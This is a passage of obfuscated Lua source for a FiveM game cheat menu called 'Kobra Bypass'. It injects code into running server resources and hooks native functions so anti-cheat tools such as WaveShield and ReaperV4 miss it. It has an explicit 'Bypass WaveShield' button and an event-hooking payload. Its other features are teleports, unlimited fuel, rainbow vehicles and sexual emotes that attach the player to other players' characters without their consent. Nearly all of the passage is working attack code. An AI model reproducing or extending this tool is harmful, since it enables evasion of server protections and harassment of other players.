                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else v12:Notify("error","Kobra","Rainbow Vehicle Off",10682 -7682 );if (GetResourceState("WaveShield")=="started") then local v806=1845 -(143 + 1702) ;while true do if (v806==(0 -0)) then print("swave");v48(v463,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v48(v463,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v464) if v464 then v12:Notify("success","Kobra","Unlimited Fuel On",3369 -(40 + 329) );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);else local v587=0;while true do if (v587==(0 + 0)) then v12:Notify("error","Kobra","Unlimited Fuel Off",1046 + 1954 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v465=65 -(9 + 56) ;local v466;while true do if ((585 -(531 + 53))==v465) then if ( #v466==0) then local v877=0 + 0 ;while true do if (v877==0) then v281:Notify("error","Kobra","You must select a player first!",3773 -(89 + 684) );return;end end end for v807,v808 in ipairs(v466) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v808,v808));end v465=2 + 0 ;end if (v465==2) then v281:Notify("success","Kobra","Attempted to twerk on "   ..  #v466   .. " player(s)." ,4000);break;end if (v465==0) then v466={};for v809,v810 in pairs(v27) do if v810 then v466[ #v466 + 1 + 0 ]=v809;end end v465=1;end end end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v467=0;local v468;while true do if (v467==(0 + 0)) then v468={};for v811,v812 in pairs(v27) do if v812 then v468[ #v468 + 1 + 0 ]=v811;end end v467=1;end if (v467==(614 -(238 + 375))) then if ( #v468==(0 + 0)) then v281:Notify("error","Kobra","You must select a player first!",3000);return;end for v813,v814 in ipairs(v468) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v814,v814));end v467=2 -0 ;end if (v467==(2 + 0)) then v281:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v468   .. " player(s)." ,11719 -7719 );break;end end end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v469=0;local v470;local v471;while true do if (1==v469) then if v470 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v471 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end if ((0 -0)==v469) then v470=GetResourceState("WaveShield")=="started" ;v471=GetResourceState("ReaperV4")=="started" ;v469=1;end end end},{type="button",label="Mission Row PD",onSelect=function() local v472=GetResourceState("WaveShield")=="started" ;local v473=GetResourceState("ReaperV4")=="started" ;if v472 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v473 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end end},{type="button",label="Pillbox Hospital",onSelect=function() local v474=0;local v475;local v476;while true do if (v474==(0 + 0)) then v475=GetResourceState("WaveShield")=="started" ;v476=GetResourceState("ReaperV4")=="started" ;v474=1;end if (v474==1) then if v475 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v476 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end break;end end end},{type="button",label="Grove Street",onSelect=function() local v477=GetResourceState("WaveShield")=="started" ;local v478=GetResourceState("ReaperV4")=="started" ;if v477 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v478 then MachoInjectThread(462 -(428 + 34) ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end end},{type="button",label="Legion Square",onSelect=function() local v479=GetResourceState("WaveShield")=="started" ;local v480=GetResourceState("ReaperV4")=="started" ;if v479 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v480 then MachoInjectThread(0 -0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v546) for v588,v589 in pairs(v44) do if (v589:lower()==v546:lower()) then local v815=0 -0 ;while true do if (v815==0) then v23=v589;Wait(761 -(329 + 182) );v815=1 + 0 ;end if (v815==1) then v12:ShowUI();return;end end end end end,"keybind");end}}},{type="subMenu",label="Banners",subTabs={{icon="",type="button",label="Kobra (Default)",onSelect=function() v12:SendMessage({action="updateBanner",bannerColor="150, 0, 0",bannerLink="https://jaythaagamer.simdif.com/images/th/sd_6935ae44db1fd.png?no_cache=1765129304"});end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1 + 0 ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1 + 0 ;v15=2 -1 ;end;local function v97(v282) for v481,v482 in ipairs(v16) do if (v482.label=="Server") then for v698,v699 in ipairs(v482.categories) do if (v699.label=="Triggers") then local v878=1465 -(120 + 1345) ;while true do if (v878==(337 -(8 + 329))) then v699.tabs[ #v699.tabs + (126 -(19 + 106)) ]=v282;return;end end end end end end end v12.UpdateTabChecked=function(v283,v284,v285,v286) for v483,v484 in pairs(v284 or {} ) do if ((v484.label==v285) and ((v484.type=="checkbox") or (v484.type=="slider-checkbox") or v484.type:find("checkbox"))) then v484.checked=v286;elseif (v484.type=="subMenu") then if v484.categories then for v978,v979 in pairs(v484.categories) do v283:UpdateTabChecked(v979.tabs,v285,v286);end end if v484.subTabs then v283:UpdateTabChecked(v484.subTabs,v285,v286);end end end end;v12.ShowKeybindList=function(v287,v288) v287:SendMessage({action="displayBinds",visible=true,binds=v288});end;v12.HideKeybindList=function(v289) v289:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v290,v291,v292,v293) local v294=0;local v295;local v296;local v297;while true do if (v294==0) then v295={};v296=PlayerPedId();v294=3 -2 ;end if (v294==(2 -0)) then v297=GetActivePlayers();if v297 then for v879,v880 in ipairs(v297) do if (v293 or (v880~=PlayerId())) then local v980=0;local v981;while true do if (v980==0) then v981=GetPlayerPed(v880);if (v981 and DoesEntityExist(v981) and IsEntityAPed(v981) and  not IsEntityDead(v981)) then local v1338=0;local v1339;while true do if (v1338==(0 + 0)) then v1339=GetEntityCoords(v981);if v1339 then local v1525= #(v291-v1339);if (v1525<=v292) then v295[ #v295 + 1 ]={name=GetPlayerName(v880),serverId=GetPlayerServerId(v880)};end end break;end end end break;end end end end else local v816=0 -0 ;local v817;local v818;local v819;while true do if (v816==(2 -1)) then repeat local v1022=0;while true do if (v1022==0) then if (v818 and IsPedAPlayer(v818) and DoesEntityExist(v818)) then local v1373=0 -0 ;local v1374;while true do if (v1373==0) then v1374=NetworkGetPlayerIndexFromPed(v818);if ((v1374~= -(1 -0)) and (v293 or (v1374~=PlayerId()))) then local v1544=0 + 0 ;local v1545;while true do if (v1544==(1503 -(957 + 546))) then v1545=GetEntityCoords(v818);if v1545 then local v1734=0 -0 ;local v1735;while true do if (v1734==(0 + 0)) then v1735= #(v291-v1545);if (v1735<=v292) then v295[ #v295 + 1 + 0 ]={name=GetPlayerName(v1374),serverId=GetPlayerServerId(v1374)};end break;end end end break;end end end break;end end end v819,v818=FindNextPed(v817);break;end end until  not v819 EndFindPed(v817);break;end if (v816==(0 + 0)) then v817,v818=FindFirstPed();v819=nil;v816=1 + 0 ;end end end v294=706 -(227 + 476) ;end if (v294==(5 -2)) then if ( #v295==(0 -0)) then v295={};end return v295;end if (v294==1) then v292=v292 or (502 -152) ;if ( not v296 or  not DoesEntityExist(v296) or  not IsPlayerPlaying(PlayerId())) then local v820=0 -0 ;while true do if (v820==(0 -0)) then v295={};return v295;end end end v294=2;end end end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(1000);v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",3954 -(166 + 788) );Wait(1986 -(21 + 965) );v12:Notify("info","Kobra","Hello lifetime user, thanks for using Kobra Bypass!",3000);Wait(1696 -(127 + 569) );v97({type="button",label="Bypass WaveShield [Risky]",onSelect=function() local v485=0 + 0 ;while true do if (v485==(0 + 0)) then if (GetResourceState("WaveShield")~="started") then v12:Notify("info","Kobra","WaveShield not detected.",3000);return;end for v821=1 + 0 ,2 -0  do MachoInjectResource2(3,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v485=1 + 0 ;end if (v485==(2 -1)) then v12:Notify("success","Kobra","WaveShield bypass attempted.",3000);break;end end end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() local v591=0;local v592;local v593;local v594;while true do if (0==v591) then v12:HideUI();v592=nil;v593=false;v60("Resource Name","",function(v935) local v936=0 + 0 ;while true do if (v936==(0 + 0)) then if (v935 and (v935~="")) then v592=v935;end v593=true;break;end end end,"typeable");v591=1293 -(1162 + 130) ;end if ((3 -1)==v591) then v48(v592,v594);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v592   .. "^7 successfully!" );v12:ShowUI();break;end if (1==v591) then while  not v593 do Wait(70 + 30 );end if ( not v592 or (v592=="")) then local v982=0 -0 ;while true do if ((937 -(889 + 47))==v982) then return;end if (v982==(0 + 0)) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();v982=1;end end end if (GetResourceState(v592)~="started") then local v983=1264 -(1153 + 111) ;while true do if (v983==(1 -0)) then return;end if (v983==0) then MachoMenuNotification("Error","Resource ^3"   .. v592   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v983=1 + 0 ;end end end v594=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
